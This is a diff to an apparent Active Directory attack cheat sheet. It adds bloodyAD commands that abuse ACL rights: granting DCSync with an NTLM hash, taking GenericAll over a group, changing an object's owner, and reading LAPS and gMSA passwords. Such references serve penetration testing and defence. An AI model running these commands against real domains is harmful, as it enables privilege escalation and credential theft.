@@ -2856,10 +2856,10 @@ To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privi
   	* On Linux:
   	```bash
 	# Give DCSync right to the principal identity
-	bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B addDomainSync user2
+	bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2
 	
 	# Remove right after DCSync
-	bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B delDomainSync user2
+	bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2 False
 	```
   
 * WriteDACL on Group
@@ -2867,6 +2867,13 @@ To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privi
   Add-DomainObjectAcl -TargetIdentity "INTERESTING_GROUP" -Rights WriteMembers -PrincipalIdentity User1
   net group "INTERESTING_GROUP" User1 /add /domain
   ```
+  Or  
+  ```powershell
+  bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp
+  
+  # Remove right
+  bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp False
+	```
 
 #### WriteOwner
 
@@ -2874,6 +2881,10 @@ An attacker can update the owner of the target object. Once the object owner has
 
 ```powershell
 Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
+```
+Or  
+```powershell
+bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setOwner devil_user1 target_object
 ```
 
 This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.
@@ -2885,6 +2896,10 @@ An attacker can read the LAPS password of the computer account this ACE applies 
 
 ```powershell
 Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
+```
+Or for a given computer  
+```powershell
+bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes LAPS_PC$ ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
 ```
 
 
@@ -2899,6 +2914,10 @@ $mp = $gmsa.'msDS-ManagedPassword'
 
 # Decode the data structure using the DSInternals module
 ConvertFrom-ADManagedPasswordBlob $mp
+```
+Or  
+```powershell
+python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes gmsaAccount$ msDS-ManagedPassword
 ```
 
 #### ForceChangePassword
